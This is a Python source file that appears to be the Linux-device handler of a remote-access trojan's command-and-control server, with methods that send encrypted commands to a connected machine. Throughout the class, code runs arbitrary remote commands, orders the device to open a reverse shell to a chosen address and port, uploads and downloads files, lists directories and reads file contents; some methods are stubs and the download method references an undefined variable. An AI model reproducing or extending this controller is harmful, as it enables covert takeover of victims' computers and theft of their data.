from Utils import *
from Handlers.base import Base_Handler

class Linux(Base_Handler):
    """The Linux Handler Class to interact with the Device"""
    def save_infos(self):
        """Save Infos to the Device Database"""
        infos = self.infos()

    def __init__(self, conn, addr, key, id):
        super().__init__(addr, key, id)
        self.conn = conn
    def alive(self):
        try:
            self.conn.send(self.encrypt("alive:"))
        except socket.error:
            return False
        return True
    def load_module(self, module):
        # Send the Module to the Device
        pass

    def execute_module(self, module):
        # Send a Request to execute a Module
        # Check if Modules is loaded
        # Get Output from the Module
        try:
            with open(f"Modules/{module}.py", "r") as f:
                pass
        except FileNotFoundError:
            return "Module not found"
        self.conn.send(self.encrypt(f"module:"))
        time.sleep(1)
        self.conn.send(self.encrypt(module))
        pass

    def reverse_shell(self, address, port):
        self.conn.send(self.encrypt(f"shell:{address}:{port}"))
        output = self.decrypt(self.conn.recv(1024))
        if output.startswith("!"):
            raise Exception("Couldn't open a Reverse Shell")
        else:
            return output

    def file_upload(self, fil, path):
        f = open(fil, "rb")
        fil = fil.split("/")
        self.conn.send(self.encrypt(f"file-u:{fil[-1]}|{path}"))
        time.sleep(1)
        self.conn.sendfile(f)
        output = self.decrypt(self.conn.recv(1024))
        if output.startswith("!"):
            raise Exception("File Upload Failed")
        else:
            return output

    def file_download(self, local_path: str, remote_file:str):
        f = open(fil, "rb")
        fil = fil.split("/")
        self.conn.send(self.encrypt(f"file-d:{remote_file}"))
        fil = self.conn.recv(1024)
        if fil.startswith("!"):
            raise Exception("Couldn't download the File")
        else:
            with open(local_path, "wb") as f:
                f.write(fil)
            return "File Downloaded to " + local_path + " ."

    def rce(self, cmd:str):
        self.conn.send(self.encrypt(f"cmd:{cmd}"))
        output = self.decrypt(self.conn.recv(1024))
        return output

    def infos(self):
        """Get Infos about a Device
        Args:
        Returns:
            str: Infos about the Device
        """
        self.conn.send(self.encrypt(f"infos:"))
        output = self.decrypt(self.conn.recv(1024))
        return output

    def get_directory_contents(self, dir:str):
        self.conn.send(self.encrypt(f"dir:{dir}"))
        output = self.decrypt(self.conn.recv(1024))
        if output.startswith("!"):
            raise Exception("Couldn't get the Directory")
        else:
            return output

    def get_file_contents(self, path:str):
        self.conn.send(self.encrypt(f"content:{path}"))
        output = self.decrypt(self.conn.recv(1024))
        if output.startswith("!"):
            raise Exception("Couldn't get the File")
        else:
            return output
